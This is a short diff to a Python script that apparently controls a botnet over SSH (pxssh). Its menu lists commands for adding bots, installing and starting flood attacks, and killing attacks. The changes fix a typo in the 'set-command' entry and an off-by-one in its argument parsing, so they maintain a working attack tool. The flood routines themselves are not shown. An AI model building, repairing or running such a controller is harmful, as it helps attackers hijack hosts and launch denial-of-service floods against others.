@@ -19,7 +19,7 @@
 #COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
 #IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
 #CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
-#Update 23/05/2014
+#update 23/05/2014 beta 
 import pxssh
 import os
 import sys
@@ -255,7 +255,7 @@ def muda():
 def main():
     escolha = {"use kill_Attack": desconnect,"use menu": banner,"use add_Attack": add_bot, "use status": status_bot, "use delete_all": delete_bot, "use set-command" : comando_bot}
     while True:
-        COMMANDS = ['desconnect','menu','add_Attack','clear_install','install_g3m','attack_g3m','attack_start','install_flood','use','delete', 'status', 'delete_all', 'set-commad','create', 'encrypt' , 'descrypt','clear']
+        COMMANDS = ['desconnect','menu','add_Attack','clear_install','install_g3m','attack_g3m','attack_start','install_flood','use','delete', 'status', 'delete_all', 'set-command','create', 'encrypt' , 'descrypt','clear']
 
         def complete(text, state):
             for cmd in COMMANDS:
@@ -323,7 +323,7 @@ def main():
             main()
 
         elif search("use set-command", selecao):
-            bot = selecao[14:]
+            bot = selecao[15:]
             comando_bot(bot)
             main()
 
